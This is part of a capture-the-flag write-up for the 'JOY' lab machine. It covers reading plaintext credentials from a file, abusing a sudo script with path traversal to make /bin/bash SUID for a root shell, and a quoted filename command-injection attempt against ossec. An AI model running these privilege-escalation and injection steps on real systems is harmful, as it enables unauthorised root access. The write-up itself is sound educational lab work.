@@ -370,3 +370,84 @@ www-data@JOY:/var/www/tryingharderisjoy$ whoami;id
 www-data
 uid=33(www-data) gid=33(www-data) groups=33(www-data),123(ossec)
 ```
+
+## Shell as patrick
+
+Under `/var/www/tryingharderisjoy/ossec` there is a file called `patricksecretsofjoy` that contains patrick's password:
+
+```
+www-data@JOY:/var/www/tryingharderisjoy/ossec$ cat patricksecretsofjoy
+credentials for JOY:
+patrick:apollo098765
+root:howtheheckdoiknowwhattherootpasswordis
+
+how would these hack3rs ever find such a page?
+```
+
+We can now switch to user patrick:
+
+```
+www-data@JOY:/var/www/tryingharderisjoy/ossec$ su - patrick
+Password: apollo098765
+
+patrick@JOY:~$ whoami;id
+patrick
+uid=1000(patrick) gid=1000(patrick) groups=1000(patrick),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),113(bluetooth),114(lpadmin),118(scanner),1001(ftp)
+```
+
+## Shell as root
+
+Checking the `sudo -l` we can run a file as root:
+
+```
+patrick@JOY:~$ sudo -l
+Matching Defaults entries for patrick on JOY:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User patrick may run the following commands on JOY:
+    (ALL) NOPASSWD: /home/patrick/script/test
+```
+
+This file allows us to change permission to a file, so let's make `/bin/bash` SUID. We will do a trick we will use `..` to move to a parent directory.
+
+```
+patrick@JOY:~$ sudo /home/patrick/script/test
+I am practising how to do simple bash scripting!
+What file would you like to change permissions within this directory?
+../../../../bin/bash
+../../../../bin/bash
+What permissions would you like to set the file to?
+4757
+4757
+Currently changing file permissions, please wait.
+Tidying up...
+Done!
+patrick@JOY:~$ /bin/bash -p
+bash-4.4# whoami;id
+root
+uid=1000(patrick) gid=1000(patrick) euid=0(root) groups=1000(patrick),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),113(bluetooth),114(lpadmin),118(scanner),1001(ftp)
+```
+
+## Reading the flag(s)
+
+```
+bash-4.4# cat proof.txt
+Never grant sudo permissions on scripts that perform system functions!
+```
+
+## For readers
+
+I think the box has another privilege escalation way but i wasn't able to exploit it. :( I hope you guys can help me out with it. I believe its about `ossec` there is an [exploit](https://www.exploit-db.com/exploits/37265){:target="_blank"} I tried to do this as user `www-data` but didn't work:
+
+```
+touch "y-\$(chmod 777 root)"
+```
+
+If you find a way to exploit this, please send me a message! :)
+
+## Thank You
+
+Thank you for taking the time to read my writeup. If you don't understand something from the writeup or want to ask me something feel free to contact me through discord(0xatom#8707) or send me a message through twitter [0xatom](https://twitter.com/0xatom){:target="_blank"} :blush:
+
+Until next time keep pwning hard! :fire:
